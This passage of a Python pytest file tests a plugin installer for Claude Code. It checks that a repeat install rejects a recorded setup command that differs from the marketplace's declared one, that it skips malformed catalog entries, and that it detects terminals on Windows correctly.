    """At the scanned commit, a repeat install still has to find the command the
    checkout declares in Claude Code's record, not some other command."""

    runtimes.declared = DECLARED
    base = ("--apply", "--yes", "--runtime", "claude-code", "--accept-command", DECLARED)
    exit_code, _output, error = _install(spec_file, *base)
    assert exit_code == 0, error

    record = runtimes.claude_home / "plugins" / "installed_plugins.json"
    record.write_text(record.read_text(encoding="utf-8").replace("node setup.js", "node other.js"), encoding="utf-8")
    before = len(runtimes.ran)
    exit_code, _output, error = _install(spec_file, *base)
    assert exit_code == 4
    assert "installed by running a command that is not the one the acme marketplace declares" in error
    assert "claude plugin uninstall toolgate@acme" in error
    assert not any(argv[:2] == ["claude", "plugin"] for argv in runtimes.ran[before:])


def test_a_catalog_entry_that_is_not_an_object_does_not_stop_a_repeat_install(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
) -> None:
    """The marketplace catalog is third-party content, so entries that are not
    objects are skipped when looking up the declared command."""

    runtimes.declared = DECLARED
    base = ("--apply", "--yes", "--runtime", "claude-code", "--accept-command", DECLARED)
    exit_code, _output, error = _install(spec_file, *base)
    assert exit_code == 0, error

    catalog = runtimes.claude_marketplace / ".claude-plugin" / "marketplace.json"
    data = json.loads(catalog.read_text(encoding="utf-8"))
    data["plugins"] = ["toolgate", None, *data["plugins"]]
    catalog.write_text(json.dumps(data), encoding="utf-8")
    exit_code, output, error = _install(spec_file, *base)
    assert exit_code == 0, error
    assert "already installed" in output + error


class _Stream(io.StringIO):
    def __init__(self, tty: bool) -> None:
        super().__init__()
        self._tty = tty

    def isatty(self) -> bool:
        return self._tty

    def fileno(self) -> int:
        return 0


def test_stream_is_terminal_trusts_isatty_off_windows(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(runner, "_ON_WINDOWS", False)
    monkeypatch.setattr(runner, "_windows_console", lambda descriptor: pytest.fail("console mode is Windows only"))
    assert runner.stream_is_terminal(_Stream(True))
    assert not runner.stream_is_terminal(_Stream(False))
    assert not runner.stream_is_terminal(None)


def test_stream_is_terminal_refuses_windows_nul_device(monkeypatch: pytest.MonkeyPatch) -> None:
    """`< NUL` passes isatty() on Windows; only a console has a console mode."""

    monkeypatch.setattr(runner, "_ON_WINDOWS", True)
    monkeypatch.setattr(runner, "_windows_console", lambda descriptor: False)
    assert not runner.stream_is_terminal(_Stream(True))
    monkeypatch.setattr(runner, "_windows_console", lambda descriptor: True)
    assert runner.stream_is_terminal(_Stream(True))


@pytest.mark.skipif(os.name != "nt", reason="the NUL device is Windows only")
def test_windows_nul_device_is_not_a_terminal() -> None:
    with open(os.devnull) as nul:
        assert not runner.stream_is_terminal(nul)
